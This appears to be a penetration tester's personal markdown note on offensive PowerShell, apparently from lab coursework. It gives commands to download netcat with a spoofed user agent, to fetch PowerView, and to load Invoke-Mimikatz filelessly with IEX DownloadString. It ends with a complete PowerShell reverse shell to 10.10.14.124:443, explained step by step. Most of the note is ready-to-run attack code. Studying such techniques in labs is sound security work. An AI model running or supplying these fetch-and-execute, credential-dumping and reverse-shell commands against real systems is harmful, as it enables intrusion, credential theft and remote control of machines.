---
type: tool
category: windows, powershell
tags:
  - tool
---
# Overview

## Useful commands
### Search for File
```powershell
Get-ChildItem -Path C:\ -Filter "FILENAME" -Recurse -ErrorAction SilentlyContinue
```

### File Download

#### Using Invoke-WebRequest
```powershell
Invoke-WebRequest -Uri "https://example.com/PATH" -OutFile "PATH\FILENAME"
```

##### Spoofing/faking User Agent
It is also possible to change the default user agent, which makes it possible to `spoof/obfuscate` the sending service with the parameter `$UserAgent`Here is an example:
```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
```

```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
#### Using Net.Wbclient
Download file with the `Net.Wbclient` class and the method `DownloadFile` in PowerShell:
1. Set Parameters 
```powershell
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```
2. Specify web address and file location and initiate the download:
```powershell
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```


### Fileless attack
PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`:
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
### Common Errors with PowerShell

There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.

![[5c1a179262c9e3f6801f6e919cdf08f0_MD5.png]]

This can be bypassed using the parameter `-UseBasicParsing`:
```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

### Reverseshell Client Connection
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.124',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

^00edd2
==Command explained:==


1. ==Calling PowerShell==
```powershell
powershell -nop -c 
```

==Executes powershell.exe with no profile (nop) and executes the command/script block (-c) contained in the quotes. This particular command is issued inside of command-prompt, which is why PowerShell is at the beginning of the command. It's good to know how to do this if we discover a Remote Code Execution vulnerability that allows us to execute commands directly in cmd.exe.==

2. ==Binding A Socket==

```powershell
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
```


==Sets/evaluates the variable $client equal to (=) the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses (10.10.14.158,443). The semi-colon (;) ensures the commands & code are executed sequentially.==
==Setting The Command Stream==

```powershell
$stream = $client.GetStream();
```


==Sets/evaluates the variable $stream equal to (=) the $client variable and the .NET framework method called GetStream that facilitates network communications. The semi-colon (;) ensures the commands & code are executed sequentially.==
==Empty Byte Stream==

```powershell
[byte[]]$bytes = 0..65535|%{0}; 
```


==Creates a byte type array ([]) called $bytes that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.==
==Stream Parameters==

```powershell
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```


==Starts a while loop containing the $i variable set equal to (=) the .NET framework Stream.Read ($stream.Read) method. The parameters: buffer ($bytes), offset (0), and count ($bytes.Length) are defined inside the parentheses of the method.==
==Set The Byte Encoding==

```powershell
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```


==Sets/evaluates the variable $data equal to (=) an ASCII encoding .NET framework class that will be used in conjunction with the GetString method to encode the byte stream ($bytes) into ASCII. In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text. The semi-colon (;) ensures the commands & code are executed sequentially.==
==Invoke-Expression==

```powershell
$sendback = (iex $data 2>&1 | Out-String ); 
```


==Sets/evaluates the variable $sendback equal to (=) the Invoke-Expression (iex) cmdlet against the $data variable, then redirects the standard error (2>) & standard output (1) through a pipe (|) to the Out-String cmdlet which converts input objects into strings. Because Invoke-Expression is used, everything stored in $data will be run on the local computer. The semi-colon (;) ensures the commands & code are executed sequentially.==
==Show Working Directory==

```powershell
$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
```


==Sets/evaluates the variable $sendback2 equal to (=) the $sendback variable plus (+) the string PS ('PS') plus + path to the working directory ((pwd).path) plus (+) the string '> '. This will result in the shell prompt being PS C:\workingdirectoryofmachine >. The semi-colon (;) ensures the commands & code are executed sequentially. Recall that the + operator in programming combines strings when numerical values aren't in use, with the exception of certain languages like C and C++ where a function would be needed.==
==Sets Sendbyte==

```powershell
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```


==Sets/evaluates the variable $sendbyte equal to (=) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.==
==Terminate TCP Connection==

```powershell
$client.Close()"
```


==This is the TcpClient.Close method that will be used when the connection is terminated.==
## Important Parameter
